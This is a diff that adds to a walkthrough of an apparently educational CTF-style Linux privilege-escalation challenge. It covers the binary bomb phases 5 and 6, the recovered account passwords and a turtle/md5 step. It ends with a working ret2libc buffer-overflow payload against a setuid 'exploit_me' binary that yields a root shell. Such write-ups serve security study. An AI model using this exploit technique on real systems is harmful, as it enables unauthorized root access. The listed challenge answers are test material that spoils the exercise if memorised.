@@ -512,16 +512,177 @@ void phase_5(int param_1)
 >   return;
 > }
 
+There should be a string as a parametr. It length might be equal 6. 
+It should consist of the characters defined in the 'array.123' and correspond to the string "giants":
+
+>  0804b220 69              ??         69h    i
+>  0804b221 73              ??         73h    s
+>  0804b222 72              ??         72h    r
+>  0804b223 76              ??         76h    v
+>  0804b224 65              ??         65h    e
+>  0804b225 61              ??         61h    a
+>  0804b226 77              ??         77h    w
+>  0804b227 68              ??         68h    h
+>  0804b228 6f              ??         6Fh    o
+>  0804b229 62              ??         62h    b
+>  0804b22a 70              ??         70h    p
+>  0804b22b 6e              ??         6Eh    n
+>  0804b22c 75              ??         75h    u
+>  0804b22d 74              ??         74h    t
+>  0804b22e 66              ??         66h    f
+>  0804b22f 67              ??         67h    g
+
+We can assume that the letters in 'array.123' correspond to the letters of an alphabet. For example:
+
+i s r v e a w h o b p n u t f g
+
+a b c d e f g h i g k l m n o p
+q r s t u v w x u z
+
+If we compare strings and choose the analogues in the alphabet, we will have the following possibilities of our answer:
+
+p, a/q, f/v, l, n, b/r
+
+Following the hint in the README file, we should have the firs character 'o'. So we need to rotate our string in one character left:
+
+i s r v e a w h o b p n u t f g
+
+z a b c d e f g h i g k l m n o
+p q r s t u v w x y z
 
 
+in this case we have the following possible answer:
+
+o, z/p, e/u, k, m, a/q
+
+ozekma, opekma, ozukma, opukma, ozekmq, opekmq, ozukmq, opukmq
 
 
+Let's try to pick a password. The second variant, opekma, worked well. We have output:
+
+> Good work!  On to the next...
 
 
+The last stage. Phase 6 has the following code:
+
+> void phase_6(undefined4 param_1)
+> 
+> {
+>   int *piVar1;
+>   int iVar2;
+>   int *piVar3;
+>   int iVar4;
+>   int *local_34 [6];
+>   int local_1c [6];
+>   
+>   read_six_numbers(param_1,local_1c);
+>   iVar4 = 0;
+>   do {
+>     if (5 < local_1c[iVar4] - 1U) {
+>       explode_bomb();
+>     }
+>     iVar2 = iVar4 + 1;
+>     if (iVar2 < 6) {
+>       do {
+>         if (local_1c[iVar4] == local_1c[iVar2]) {
+>           explode_bomb();
+>         }
+>         iVar2 = iVar2 + 1;
+>       } while (iVar2 < 6);
+>     }
+>     iVar4 = iVar4 + 1;
+>   } while (iVar4 < 6);
+>   iVar4 = 0;
+>   do {
+>     iVar2 = 1;
+>     piVar3 = (int *)node1;
+>     if (1 < local_1c[iVar4]) {
+>       piVar3 = (int *)node1;
+>       do {
+>         piVar3 = (int *)piVar3[2];
+>         iVar2 = iVar2 + 1;
+>       } while (iVar2 < local_1c[iVar4]);
+>     }
+>     local_34[iVar4] = piVar3;
+>     iVar4 = iVar4 + 1;
+>   } while (iVar4 < 6);
+>   iVar4 = 1;
+>   piVar3 = local_34[0];
+>   do {
+>     piVar1 = local_34[iVar4];
+>     *(int **)(piVar3 + 2) = piVar1;
+>     iVar4 = iVar4 + 1;
+>     piVar3 = piVar1;
+>   } while (iVar4 < 6);
+>   piVar1[2] = 0;
+>   iVar4 = 0;
+>   do {
+>     if (*local_34[0] < *(int *)local_34[0][2]) {
+>       explode_bomb();
+>     }
+>     local_34[0] = (int *)local_34[0][2];
+>     iVar4 = iVar4 + 1;
+>   } while (iVar4 < 5);
+>   return;
+> }
+
+Here we should have 6 parameters, all numbers less than 6.
+According the hint, the first parameter should be '4'. So we have !5 = 120 possibilities. We tried them all. The true answer is 4 2 6 3 1 5.
+
+The output is:
+
+> Congratulations! You've defused the bomb!
 
 
+So, together without spaces we received the password for thor account:
+
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 
+So we know that we need to log in as thor with the password we learned from bomb.
+After we logged in we do `ls` and see README file with the line :
 
+> Finish this challenge and use the result as password for 'zaz' user.
 
+and turtle file.
+
+We copied it to our computr and made some reserch. And it ocures that it has not that many commands as it seemed.
+
+After some google reserch we find the script that can help us to recreate the drawing.
+So we need to run turtle_code_transf.py by running in a command line:
+
+> python turtle_code_transf.py
+
+It generates a second executable file that shows us a word `SLASH` written by a turtle.  :slightly_smiling_face:
+
+So we try to use this word to get into zaz account (README file instuction).
+And it's not coreect. So we thought that the password might be the incripted version of this word.
+We used several incription methods but only md5 worked. Using online convertor we got a password - `646DA671CA01BB5D84DBB5FB2238DC8E`.
+This password didn't work. So we tried to write `SLASH` in mall letters and get the code. And this worked! So the password for zaz account is `646da671ca01bb5d84dbb5fb2238dc8e`.
+
+So we got into the zaz account and see 2 files:
+- exploit_me
+- mail
+
+We can use gdb - debagger - to see what we have. So
+> gdb
+> file exploit_me
+> dissas main
+
+We see (screenshot 4) that the that program uses 140 bytes and tries to compare a string without any length validation with insecure "strcpy" and we can try to overflow the buffer.
+We can use ret2libc attack for that. But we need to know the system address and the exit address. So we nned to do the following:
+> b main - to set a breakpoint at main function
+> run - to start a program
+> p system - prints system address - `$1 = {<text variable, no debug info>} 0xb7e6b060 <system>`
+> p exit - prints exit address - `$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>`
+> quit - we have all information we need.
+
+Now we can overflow the buffer using python. Run:
+> ./exploit_me $(python -c "print('.'*140 + '\xb7\xe6\xb0\x60'[::-1]+'\xb7\xe5\xeb\xe0'[::-1]+'\xb7\xf8\xcc\x58'[::-1])")
+
+The result of execution of this command will be you getting to the root.
+
+You may check it by using command `whoami` and you'll receive an answer - root :slightly_smiling_face:
+
+Thats all for today! Thank you!
 
